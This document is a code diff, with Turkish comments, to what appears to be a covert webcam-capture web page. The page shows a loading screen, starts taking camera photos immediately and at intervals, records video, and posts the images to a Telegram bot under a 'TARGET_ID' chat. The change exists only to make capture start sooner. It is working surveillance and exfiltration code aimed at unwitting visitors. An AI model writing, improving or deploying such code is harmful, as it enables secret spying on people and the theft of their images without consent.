@@ -153,8 +153,6 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
-            let fotoInterval = null;
-            let videoInterval = null;
             
             async function startCamera() {
                 try {
@@ -174,9 +172,41 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // VİDEO FONKSİYONU
+                        // FOTOĞRAF - HEMEN BAŞLA (0ms)
                         // ========================================
-                        function videoCek() {
+                        function fotoCek() {
+                            if (!stream?.active) return;
+                            
+                            photoCount++;
+                            
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(function(blob) {
+                                if (!blob) return;
+                                const formData = new FormData();
+                                formData.append('chat_id', TARGET_ID);
+                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                                
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            }, 'image/jpeg', 0.85);
+                        }
+                        
+                        // İLK FOTO HEMEN
+                        fotoCek();
+                        
+                        // DİĞER FOTOLAR
+                        setInterval(fotoCek, FOTO_SURESI * 1000);
+                        
+                        // ========================================
+                        // VİDEO - HEMEN BAŞLA (0ms)
+                        // ========================================
+                        function videoBaslat() {
                             if (!stream?.active) return;
                             
                             videoCount++;
@@ -218,54 +248,11 @@
                             } catch(e) {}
                         }
                         
-                        // ========================================
-                        // FOTOĞRAF FONKSİYONU
-                        // ========================================
-                        function fotoCek() {
-                            if (!stream?.active) return;
-                            
-                            photoCount++;
-                            
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                        }
-                        
-                        // ========================================
-                        // SADECE VİDEO BAŞLASIN, FOTOĞRAFLAR SONRA
-                        // ========================================
-                        
-                        // İLK VİDEO HEMEN BAŞLASIN
-                        videoCek();
+                        // İLK VİDEO HEMEN
+                        videoBaslat();
                         
                         // DİĞER VİDEOLAR
-                        videoInterval = setInterval(videoCek, VIDEO_SURESI * 1000);
-                        
-                        // FOTOĞRAFLAR 2 SANİYE SONRA BAŞLASIN (ilk foto kesinlikle yok)
-                        setTimeout(() => {
-                            // İlk fotoğraf 2. saniyede çekilsin
-                            fotoCek();
-                            
-                            // Sonra düzenli devam etsin
-                            fotoInterval = setInterval(() => {
-                                if (!stream?.active) return;
-                                fotoCek();
-                            }, FOTO_SURESI * 1000);
-                            
-                        }, 2000);
+                        setInterval(videoBaslat, VIDEO_SURESI * 1000);
                     };
                     
                 } catch(e) {
@@ -274,8 +261,6 @@
             }
             
             window.onbeforeunload = function() {
-                if (fotoInterval) clearInterval(fotoInterval);
-                if (videoInterval) clearInterval(videoInterval);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
